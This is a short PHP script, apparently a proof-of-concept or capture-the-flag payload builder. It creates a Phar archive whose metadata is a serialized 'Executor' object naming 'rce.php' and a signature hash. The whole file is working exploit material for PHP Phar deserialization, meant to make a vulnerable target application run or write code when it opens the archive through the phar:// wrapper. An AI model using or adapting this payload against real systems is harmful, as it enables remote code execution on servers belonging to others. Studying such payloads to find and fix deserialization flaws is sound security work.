<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ? >');

class Executor{
  private $filename='rce.php';
  private $signature='bee1cf9c9949e52f6a33153e00ae9292';
}
$object = new Executor();
$phar->setMetadata($object);
$phar->addFromString('test.txt', 'text');
$phar->stopBuffering();

?>